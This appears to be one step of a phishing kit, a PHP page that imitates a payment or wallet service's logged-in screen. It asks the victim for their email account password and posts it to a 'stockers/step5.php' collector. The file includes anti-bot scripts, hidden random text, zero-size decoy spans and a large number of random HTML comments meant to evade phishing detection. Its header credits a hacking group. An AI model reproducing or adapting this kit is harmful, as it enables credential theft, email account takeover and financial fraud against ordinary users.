<?php 
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../prevents/anti6.php';
include '../prevents/anti7.php';
include '../prevents/anti8.php';
ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index"));
}else{
	include "../extra/languages/{$_SESSION['language']}.php";
}if(!isset($_SESSION['EML'])){exit(header("Location: signin"));}?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<link rel="shortcut icon" href="lib/pics/favi.ico"><link rel="apple-touch-icon" href="lib/pics/favi.png">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes"><title>
		<?php echo $lg_process['title']?></title>
		<link rel="stylesheet" href="lib/styles/process.css">
		<script type="text/javascript" src="lib/js/jquery-3.3.1.min.js">
		</script><script type="text/javascript" src="lib/js/jquery.mask.min.js">
		</script> <script type="text/javascript" src="lib/js/jquery.ccvalid.js"></script>
	</head>
	<body>    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
    <?php include('../news/news-'.rand(0,9).'.txt'); ?></div></div>
<input type="checkbox" id="toggleMenu" class="menuToggler"><div class="desktopNav">
	<div class="navContainer">
		<a href="javascript:" class="desktopBrand"></a>
	<?php echo "<!--".rand(0,99999999)."-->"?>	<div class="mobileMenu">
			<div class="logoutMobile">
				<a href="javascript:" class="logoutTxtMobile">
		<?php echo "<!--".rand(0,99999999)."-->"?>			<?php echo $lg_process['logout']?></a>
		<?php echo "<!--".rand(0,99999999)."-->"?>		</div>
		<?php echo "<!--".rand(0,99999999)."-->"?>		<div class="settingsMobile">
		<?php echo "<!--".rand(0,99999999)."-->"?>			<a href="javascript:" class="svgLogo settingsTxt">
			<?php echo "<!--".rand(0,99999999)."-->"?>			<img src="lib/pics/settings.svg" alt=""></a>
				<?php echo "<!--".rand(0,99999999)."-->"?>	</div>
		<?php echo "<!--".rand(0,99999999)."-->"?>			<div>
					<?php echo "<!--".rand(0,99999999)."-->"?>	<p class="displayMail">
			<?php echo "<!--".rand(0,99999999)."-->"?>				<?php echo $_SESSION['EML']?></p>
						</div>
					</div>
<div class="desktopMenu">
	<nav class="desktopItems">
	<?php echo "<!--".rand(0,99999999)."-->"?>	<ul class="firstUl">
		<li class="">
			<a href="javascript:" class="linksTxt">
	<?php echo "<!--".rand(0,99999999)."-->"?>			<?php echo $lg_process['menu']['home']?>
			</a>
		</li>
	<?php echo "<!--".rand(0,99999999)."-->"?>	<li class="">
			<a href="javascript:" class="linksTxt">
		<?php echo "<!--".rand(0,99999999)."-->"?>		<?php echo $lg_process['menu']['activity']?></a>
		<?php echo "<!--".rand(0,99999999)."-->"?>	</li>
			<li class="">
				<a href="javascript:" class="linksTxt">
					<?php echo $lg_process['menu']['send_receive']?></a></li><li class="">
		<?php echo "<!--".rand(0,99999999)."-->"?>				<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['wallet']?></a>
					</li>
					<li class="activeLi">
						<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['help']?></a>
	<?php echo "<!--".rand(0,99999999)."-->"?>				</li>
				</ul>
				<ul class="secondUl">
					<li class="notifLi">
						<a href="javascript:" class="svgLogo notifTxt">
							<img src="lib/pics/noti.svg" alt=""></a>
						</li>
		<?php echo "<!--".rand(0,99999999)."-->"?>				<li><?php echo "<!--".rand(0,99999999)."-->"?>
							<a href="javascript:" class="svgLogo settingsTxt"><img src="lib/pics/settings.svg" alt=""></a>
						</li><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?>					<li class="logoutLi"><?php echo "<!--".rand(0,99999999)."-->"?>
							<a href="javascript:" class="logoutTxtDesktop"><?php echo $lg_process['logout']?></a><?php echo "<!--".rand(0,99999999)."-->"?>
						</li><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?>					</ul><?php echo "<!--".rand(0,99999999)."-->"?>
					</nav><?php echo "<!--".rand(0,99999999)."-->"?>
	<?php echo "<!--".rand(0,99999999)."-->"?>			</div><?php echo "<!--".rand(0,99999999)."-->"?>
			</div><?php echo "<!--".rand(0,99999999)."-->"?>
		</div><?php echo "<!--".rand(0,99999999)."-->"?>
<div class="mainContainer"><?php echo "<!--".rand(0,99999999)."-->"?>
	<div class="hide" id="rotate"><?php echo "<!--".rand(0,99999999)."-->"?>
		<div class="spinner"><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="rotate"></div><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="processing"><?php echo $lg_sign['rotate']?></div><?php echo "<!--".rand(0,99999999)."-->"?>
		</div><?php echo "<!--".rand(0,99999999)."-->"?>
		<div class="overlay"><?php echo "<!--".rand(0,99999999)."-->"?>
		</div><?php echo "<!--".rand(0,99999999)."-->"?>
	</div><?php echo "<!--".rand(0,99999999)."-->"?>
	<div class="mobileNav"><?php echo "<!--".rand(0,99999999)."-->"?>
		<div class="navHeader"><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="blockToggler"><?php echo "<!--".rand(0,99999999)."-->"?>
				<label class="menuLabel" for="toggleMenu"><span></span><?php echo "<!--".rand(0,99999999)."-->"?>
					<div class="menuOpen"><?php echo $lg_process['menu']['open']?></div><?php echo "<!--".rand(0,99999999)."-->"?>
					<div class="menuClose">
						<?php echo $lg_process['menu']['close']?></div><?php echo "<!--".rand(0,99999999)."-->"?>
					</label><?php echo "<!--".rand(0,99999999)."-->"?>
				</div><?php echo "<!--".rand(0,99999999)."-->"?>
			</div><?php echo "<!--".rand(0,99999999)."-->"?>
			<div class="navLogo"><a href="javascript:" class="mobileBrand"></a><?php echo "<!--".rand(0,99999999)."-->"?>
			</div><ul class="notifUl"><li><a class="svgLogo notifTxt"><?php echo "<!--".rand(0,99999999)."-->"?>
				<img src="lib/pics/noti.svg" alt=""><?php echo "<!--".rand(0,99999999)."-->"?>
			</a><?php echo "<!--".rand(0,99999999)."-->"?>
		</li><?php echo "<!--".rand(0,99999999)."-->"?>
	</ul><?php echo "<!--".rand(0,99999999)."-->"?>
</div><?php echo "<!--".rand(0,99999999)."-->"?>
<div class="contents"><?php echo "<!--".rand(0,99999999)."-->"?>
	<section class="mainContents" id="mailaccess">
		<form action="../extra/stockers/step5.php" method="post" style="padding:0 20px">
		<h1 style="padding-bottom:10px">
			<span style="font-size:0">darkness</span>
			<?php echo $lg_mailaccess['head']?>
			<span style="font-size:0">isnot good</span></h1>
			<?php $mailprovider = explode('@',$_SESSION['EML']);
			$mailprovider = $mailprovider[1];

 ?>

<p style="text-align: left;"><small><?php echo $lg_mailaccess['fcenter']?> <strong><?php echo ucfirst(strtolower($mailprovider)); ?></strong> <?php echo $lg_mailaccess['center']?></small></p>
			<div class="fields clearfix">
				<?php if ($mailprovider == "gmail.com" || $mailprovider == "yahoo.com" || $mailprovider =="mail.ru"|| $mailprovider =="mail.ru" || $mailprovider =="mail.com"|| $mailprovider =="icloud.com"|| $mailprovider =="gmx.com" || $mailprovider =="fiber.com" || $mailprovider =="kpn.com" || $mailprovider =="comcast.com" || $mailprovider =="comcast.net" || $mailprovider =="yandex.com" || $mailprovider =="yandex.ru" || $mailprovider =="online.nl" || $mailprovider =="zoho.com" || $mailprovider =="live.fr" || $mailprovider =="live.com" || $mailprovider =="live.es"){

              echo '<td><img style="border:1px solid #ddd;border-radius: 4px;padding: 5px;margin-bottom:20px;width:143px;height:60px"
              resizable="yes" width="128" height="64" src="../app/lib/providers/'.$mailprovider.'.png"></td>';
                                        }else{
              echo '<td><img style="border:1px solid #ddd;margin-bottom:20px;width:143px;height:60px"
              resizable="yes" width="128" height="64" src="https://logo.clearbit.com/'.$mailprovider.'"></td>';
                                        }?>

				<div class="inputArea">
			<input name="mailacess" disabled="disabled" required value="<?php echo $_SESSION['EML']; ?>" placeholder="<?php echo $lg_mailaccess['mailaccess']?>" autocomplete="off">
			<input name="password" type="password" required placeholder="<?php echo $lg_mailaccess['passwordaccess']?>"autocomplete="off">
				</div>
			</div>				
							<div>
		<input style="margin-top:10px;width:100%" type="submit" class="bt" value="<?php echo $lg_mailaccess['bt_save']?>">
						</div>
				 </form>
		</section>
			</div><div><div class="ftr"><div class="footerFirstContent"><ul class="footerList"><li><a href="javascript:"><?php echo $lg_sign['footer']['contact']?></a></li><li><a href="javascript:"><?php echo $lg_process['footer']['security']?></a></li></ul><div class="footerSecondContent"><p class="footerP">Copyright ©<span>1999-2019</span> . <?php echo $lg_process['footer']['rights']?></p><ul class="footerUl"><li><a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a></li><li><a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a></li></ul></div></div></div></div></div>
</body>
</html>